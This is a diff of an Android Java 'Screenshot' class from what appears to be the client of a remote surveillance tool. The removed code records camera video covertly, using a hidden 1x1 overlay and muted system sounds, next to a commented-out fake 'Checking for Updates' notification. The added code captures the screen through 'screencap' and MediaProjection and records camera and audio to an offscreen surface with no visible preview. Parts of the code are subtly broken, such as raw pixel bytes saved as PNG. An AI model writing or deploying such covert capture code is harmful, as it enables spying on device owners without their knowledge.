@@ -29,23 +29,14 @@ import android.os.Looper;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.Display;
+import android.view.Surface;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 import android.view.View;
 import android.view.WindowManager;
 
-import androidx.annotation.NonNull;
-import androidx.core.app.NotificationCompat;
-
-import com.ot.grhq.client.IScreenshotProvider;
-import com.ot.grhq.client.R;
-
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
-
-import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -56,6 +47,13 @@ public class Screenshot {
 
     private static MediaProjection mediaProjection;
     private static ImageReader imageReader;
+
+    private static boolean isRecording = false;
+
+    private static MediaRecorder mediaRecorder;
+    private static SurfaceTexture surfaceTexture;
+    private static Surface surface;
+
 
     private static android.hardware.Camera camera;
 
@@ -110,68 +108,61 @@ public class Screenshot {
      * Take screenshot of device
      * @return
      */
-    public static String captureScreen(IScreenshotProvider aslProvider) throws RemoteException {
-        String file = null;
+    public static String captureScreen() {
+        try {
+            String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";
+            Process process = Runtime.getRuntime().exec("screencap " + filename);
+            process.waitFor();
+            Thread.sleep(3000);
 
-        if (aslProvider == null)
-            return null;
+            if (process.exitValue() == 0)
+                return filename;
+        } catch (Exception exception) {
+            Log.e("eeee", exception.toString());
+        }
 
-        if (!aslProvider.isAvailable())
-            return null;
+        return null;
+//        if (mediaProjectionManager != null)
+//            activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE);
 
-        file = aslProvider.takeScreenshot();
+    }
 
-        return file;
-//        String filename = context.getFilesDir() + "/" + String.valueOf(System.currentTimeMillis()) + ".png";
-//        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
-//
-//        Bitmap screenshot = null;
-//        try {
-//            Display display = windowManager.getDefaultDisplay();
-//            int screenWidth = display.getWidth();
-//            int screenHeight = display.getHeight();
-//            screenshot = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
-//
-//            Canvas canvas = new Canvas(screenshot);
-//            // Get the root view of the current window and draw it onto the bitmap
-////            View rootView = ((Activity) context).getWindow().getDecorView().getRootView();
-////            rootView.draw(canvas);
-//            Paint paint = new Paint();
-//            paint.setAntiAlias(true);
-//            paint.setFilterBitmap(true);
-//            paint.setDither(true);
-//
-//            // Draw the screen content onto the bitmap
-//            canvas.drawBitmap(screenshot, 0, 0, paint);
-//
-//            if (screenshot != null) {
-//                File file = new File(context.getFilesDir(), filename);
-//                FileOutputStream stream = new FileOutputStream(file);
-//                screenshot.compress(Bitmap.CompressFormat.PNG, 100, stream);
-//                stream.close();
-//
-//                return file.getAbsolutePath();
-//            }
-//        } catch (Exception e) {}
+    public static String takeScreenshot(MediaProjection mProjection, Activity activity) {
+        String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";
 
-//
-//        ProcessBuilder processBuilder = new ProcessBuilder("screencap", filename);
-//        processBuilder.directory(new File(context.getFilesDir().toURI()));
-//        Process process = processBuilder.start();
-//
-//        // Check for errors
-//        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
-//        String line;
-//        while ((line = errorReader.readLine()) != null) {
-//            Log.d("eeee",line);
-//        }
-//
-//        // Wait for the command to complete
-//        int exitCode = process.waitFor();
-//        if (exitCode == 0)
-//            return filename;
-//
-//        return null;
+        DisplayMetrics metrics = activity.getResources().getDisplayMetrics();
+        int width = metrics.widthPixels;
+        int height = metrics.heightPixels;
+        ImageReader mImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+        mProjection.createVirtualDisplay("ScreenCapture",
+                width, height, metrics.densityDpi,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                mImageReader.getSurface(), null, null);
+
+        Image image = mImageReader.acquireLatestImage();
+        if (image != null) {
+            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+            byte[] bytes = new byte[buffer.remaining()];
+            buffer.get(bytes);
+            FileOutputStream fos = null;
+            try {
+                File file = new File(filename); // Change to your desired file location
+                fos = new FileOutputStream(file);
+                fos.write(bytes);
+            } catch (IOException e) {
+                e.printStackTrace();
+            } finally {
+                if (fos != null) {
+                    try {
+                        fos.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+            image.close();
+        }
+        return filename;
     }
 
     /**
@@ -179,148 +170,61 @@ public class Screenshot {
      * @param duration
      * @return
      */
-    public static String captureVideo(Context context, int duration) throws IOException, InterruptedException {
-//        Notification notification = new NotificationCompat.Builder(context,"channelid")
-//                .setContentTitle("Checking for Updates")
-//                .setContentText("Fetching")
-//                .setSmallIcon(R.drawable.ic_launcher_foreground)
-//                .setProgress(0,0,true)
-//                .build();
-//        startForeground(1234, notification);
+    public static String captureVideo(boolean frontCamera, int duration) throws IOException, InterruptedException {
+        File outputDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES);
+        File videoFile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".mp4", outputDir);
 
+        if (!isRecording) {
+            startRecording(frontCamera, videoFile.getAbsolutePath());
 
-        File outputDir = context.getFilesDir();
-        File videoFile = null;
-
-        try {
-           videoFile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".mp4", outputDir);
-        } catch (IOException e) {
-            e.printStackTrace();
+            // Stop recording after duration
+            Thread.sleep(duration * 1000L);
+            stopRecording();
         }
-        OutputStream outputStream = new FileOutputStream(videoFile);
-
-        final Camera[] camera = {null};
-        final MediaRecorder[] mediaRecorder = {null};
-        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
-        SurfaceView surfaceView = new SurfaceView(context);
-        final WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
-                1, 1,
-                WindowManager.LayoutParams.TYPE_TOAST,
-                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
-                PixelFormat.TRANSLUCENT
-        );
-        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
-
-        windowManager.addView(surfaceView, layoutParams);
-        File finalVideoFile = videoFile;
-        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
-            @Override
-            public void surfaceCreated(SurfaceHolder surfaceHolder) {
-
-                AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
-                audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
-                audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
-                audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
-                audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
-                audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
-                audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
-
-                try {
-                    camera[0] = Camera.open();
-                } catch (Exception e) {
-
-                    e.printStackTrace();
-                    new Thread(new Runnable() {
-                        @Override
-                        public void run() {
-                            try {
-                                outputStream.write("Failed to open camera\n".getBytes("UTF-8"));
-                            } catch (IOException ex) {
-                                ex.printStackTrace();
-                            }
-                        }
-                    }).start();
-                    return;
-                }
-
-
-                mediaRecorder[0] = new MediaRecorder();
-                camera[0].unlock();
-                mediaRecorder[0].setPreviewDisplay(surfaceHolder.getSurface());
-                mediaRecorder[0].setCamera(camera[0]);
-                mediaRecorder[0].setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
-                mediaRecorder[0].setVideoSource(MediaRecorder.VideoSource.CAMERA);
-                try {
-                    mediaRecorder[0].setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_480P));
-                } catch (RuntimeException e) {
-                    e.printStackTrace();
-                    new Thread(new Runnable() {
-                        @Override
-                        public void run() {
-                            try {
-                                outputStream.write("Error in Initialing Camera \n".getBytes("UTF-8"));
-                            } catch (IOException ex) {
-                                ex.printStackTrace();
-                            }
-                        }
-                    }).start();
-                    return;
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    mediaRecorder[0].setOutputFile(finalVideoFile);
-                } else {
-                    mediaRecorder[0].setOutputFile(finalVideoFile.getAbsolutePath());
-                }
-
-                try {
-                    mediaRecorder[0].prepare();
-                } catch (Exception e) {
-                }
-                mediaRecorder[0].start();
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        try {
-                            outputStream.write("Started Recording Video\n".getBytes("UTF-8"));
-                        } catch (IOException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                }).start();
-            }
-
-            @Override
-            public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height) {
-
-            }
-
-            @Override
-            public void surfaceDestroyed(@NonNull SurfaceHolder holder) {
-                if (mediaRecorder[0] != null) {
-                    try {
-                        mediaRecorder[0].stop();
-                    } catch (Exception e) {
-                        e.printStackTrace();
-                    }
-
-                    mediaRecorder[0].reset();
-                    mediaRecorder[0].release();
-                    mediaRecorder[0] = null;
-                }
-
-                if (camera[0] != null) {
-                    camera[0].release();
-                    camera[0] = null;
-                }
-            }
-        });
 
         return videoFile.getAbsolutePath();
     }
 
-    public static void cleanup(String path) {
+    private static void startRecording(boolean frontCamera, String filePath) throws IOException {
+        surfaceTexture = new SurfaceTexture(0);
+        surface = new Surface(surfaceTexture);
 
+        Camera camera = frontCamera ? Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT) : Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
+        camera.unlock();
+        mediaRecorder = new MediaRecorder();
+        mediaRecorder.setCamera(camera);
+        mediaRecorder.setPreviewDisplay(surface);
+        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
+        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
+        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+        mediaRecorder.setOutputFile(filePath);
+        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.MPEG_4_SP);
+        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+        mediaRecorder.setVideoFrameRate(30); // 30 fps
+        mediaRecorder.setVideoSize(1280, 720); // 720p
+
+        // Prepare and start recording
+        try {
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+            isRecording = true;
+        } catch (Exception e) {
+            Log.e("eeee", e.toString());
+        }
     }
+
+    private static void stopRecording() {
+        if (isRecording) {
+            mediaRecorder.stop();
+            mediaRecorder.release();
+            mediaRecorder = null;
+            isRecording = false;
+
+            surfaceTexture = null;
+            surface = null;
+        }
+    }
+
 
     /**
      * Select the camera to use
